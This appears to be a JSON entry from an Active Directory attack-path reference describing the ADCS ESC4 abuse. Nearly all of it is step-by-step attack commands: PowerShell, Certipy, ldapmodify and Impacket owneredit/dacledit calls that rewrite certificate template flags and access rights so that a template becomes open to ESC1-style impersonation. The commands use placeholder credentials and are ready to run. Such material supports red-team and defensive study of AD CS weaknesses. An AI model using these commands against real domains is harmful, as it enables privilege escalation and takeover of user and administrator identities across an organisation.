{
    "ADCSESC4": {
        "meaning": "The ADCSESC4 edge indicates that the principal has the privileges to perform the ADCS ESC4 abuse against the target AD domain. The principal has permissions to modify the settings on one or more certificate templates, enabling them to configure the certificate templates for ADCS ESC1 conditions.",
        "common": "",
        "windows": {
            "PowerShell_TemplateModification": [
                {
                    "order": 1,
                    "command": "$templateName = \"TemplateName\"; $rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\"); $template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"",
                    "description": "Connect to certificate template in LDAP"
                },
                {
                    "order": 2,
                    "command": "$eku = \"1.3.6.1.5.5.7.3.2\"; $template.Properties[\"pKIExtendedKeyUsage\"].Add($eku) | Out-Null; $template.Properties[\"msPKI-Certificate-Application-Policy\"].Add($eku) | Out-Null; $template.CommitChanges()",
                    "description": "Add Client Authentication EKU to template"
                },
                {
                    "order": 3,
                    "command": "$flagToFlip = 0x00000001; $curValue = $template.Properties[\"msPKI-Certificate-Name-Flag\"].Value; $template.Properties[\"msPKI-Certificate-Name-Flag\"].Value = $curValue -bxor $flagToFlip; $template.CommitChanges()",
                    "description": "Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag"
                },
                {
                    "order": 4,
                    "command": "$flagToFlip = 0x00000002; $curValue = $template.Properties[\"msPKI-Enrollment-Flag\"].Value; $template.Properties[\"msPKI-Enrollment-Flag\"].Value = $curValue -bxor $flagToFlip; $template.CommitChanges()",
                    "description": "Remove CT_FLAG_PEND_ALL_REQUESTS flag to disable manager approval"
                },
                {
                    "order": 5,
                    "command": "$template.Properties[\"msPKI-RA-Signature\"].Value = [Int32]0; $template.CommitChanges()",
                    "description": "Set msPKI-RA-Signature to 0 to disable authorized signatures requirement"
                }
            ],
            "PowerShell_PermissionGrant": [
                {
                    "order": 1,
                    "command": "$principalName = \"principal\"; $account = New-Object System.Security.Principal.NTAccount($principalName); $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])",
                    "description": "Get principal SID for ACE creation"
                },
                {
                    "order": 2,
                    "command": "$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid, [System.DirectoryServices.ActiveDirectoryRights]::GenericAll, [System.Security.AccessControl.AccessControlType]::Allow)",
                    "description": "Create GenericAll ACE for template modification"
                },
                {
                    "order": 3,
                    "command": "$acl = $template.psbase.ObjectSecurity; $acl.AddAccessRule($ace); $template.psbase.CommitChanges()",
                    "description": "Grant GenericAll permission on certificate template"
                }
            ]
        },
        "linux": {
            "Certipy_TemplateVuln": [
                {
                    "order": 1,
                    "command": "certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old",
                    "description": "Make certificate template vulnerable to ESC1 using Certipy"
                },
                {
                    "order": 2,
                    "command": "# Template is now vulnerable to ESC1 - perform ESC1 attack",
                    "description": "Template configuration modified for ESC1 abuse"
                },
                {
                    "order": 3,
                    "command": "certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json",
                    "description": "Restore original template configuration after abuse"
                }
            ],
            "LDAP_TemplateModification": [
                {
                    "order": 1,
                    "command": "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Set Client Authentication EKU using ldapmodify"
                },
                {
                    "order": 2,
                    "command": "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Name-Flag\\nmsPKI-Certificate-Name-Flag: 1\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag"
                },
                {
                    "order": 3,
                    "command": "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Remove all enrollment flags to disable manager approval"
                },
                {
                    "order": 4,
                    "command": "echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-RA-Signature\\nmsPKI-RA-Signature: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Remove authorized signatures requirement"
                }
            ],
            "Impacket_PermissionTools": [
                {
                    "order": 1,
                    "command": "owneredit.py -action write -new-owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
                    "description": "Change ownership of certificate template using owneredit"
                },
                {
                    "order": 2,
                    "command": "dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
                    "description": "Grant FullControl permissions using dacledit"
                },
                {
                    "order": 3,
                    "command": "dacledit.py -action 'write' -rights 'ExtendedRight' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
                    "description": "Grant enrollment rights on certificate template"
                }
            ]
        }
    }
}
